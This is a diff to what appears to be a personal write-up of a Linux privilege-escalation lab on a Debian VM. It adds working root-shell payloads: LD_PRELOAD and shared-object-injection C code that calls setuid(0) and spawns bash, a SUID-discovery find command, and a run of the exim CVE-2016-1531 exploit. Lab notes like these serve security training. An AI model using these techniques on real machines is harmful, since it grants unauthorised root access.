@@ -341,10 +341,27 @@ Sudo can be configured to inherit certain environment variables from the user's 
     LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
 
 - Create a shared object using the code located at `/home/user/tools/sudo/preload.c`:
+    
+    - Source code:
 
-    ```bash
-    user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
-    ```
+        ```c
+        user@debian:~$ cat /home/user/tools/sudo/preload.c
+        #include <stdio.h>
+        #include <sys/types.h>
+        #include <stdlib.h>
+
+        void _init() {
+                unsetenv("LD_PRELOAD");
+                setresuid(0,0,0);
+                system("/bin/bash -p");
+        }
+        ```
+
+    - Compile.
+
+        ```bash
+        user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+        ```
 
 - Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
 
@@ -613,4 +630,123 @@ View the contents of the system-wide crontab:
     root
     ```
 
-## TO-DO Tomorrow
+## SUID / SGID Executables - Known Exploits
+- Find all the SUID/SGID executables on the Debian VM:
+
+    ```bash
+    user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
+    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
+    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
+    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
+    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
+    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
+    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
+    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
+    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
+    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
+    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
+    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
+    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
+    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
+    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
+    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
+    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
+    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
+    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
+    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
+    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
+    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
+    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
+    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
+    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
+    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+    ```
+
+    Note that `/usr/sbin/exim-4.84-3` appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
+
+    A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at `/home/user/tools/suid/exim/cve-2016-1531.sh`.
+
+- Run the exploit script to gain a root shell:
+
+    ```bash
+    user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
+    [ CVE-2016-1531 local root exploit
+    sh-4.1# 
+    ```
+
+## SUID / SGID Executables - Shared Object Injection
+The `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection.
+
+- First, execute the file and note that currently it displays a progress bar before exiting:
+
+    ```bash
+    user@debian:~$ /usr/local/bin/suid-so
+    Calculating something, please wait...
+    [=====================================================================>] 99 %
+    Done.
+    ```
+
+- Run `strace` on the file and search the output for open/access calls and for "no such file" errors:
+
+    ```bash
+    user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+    open("/etc/ld.so.cache", O_RDONLY)      = 3
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    open("/lib/libdl.so.2", O_RDONLY)       = 3
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    open("/lib/libm.so.6", O_RDONLY)        = 3
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+    open("/lib/libc.so.6", O_RDONLY)        = 3
+    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+    ```
+
+    Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within our home directory, but it cannot be found.
+
+- Create the .config directory for the libcalc.so file:
+
+    ```bash
+    user@debian:~$ mkdir /home/user/.config
+    ```
+
+- Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+
+    - libcalc.c:
+
+        ```c
+        user@debian:~$ cat /home/user/tools/suid/libcalc.c
+        #include <stdio.h>
+        #include <stdlib.h>
+
+        static void inject() __attribute__((constructor));
+
+        void inject() {
+                setuid(0);
+                system("/bin/bash -p");
+        }
+        ```
+
+    - Compiling.
+
+        ```bash
+        user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+        ```
+
+- Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+
+    ```bash
+    user@debian:~$ /usr/local/bin/suid-so
+    Calculating something, please wait...
+    bash-4.1# 
+    ```
+
+## SUID / SGID Executables - Environment Variables
+TO-DO
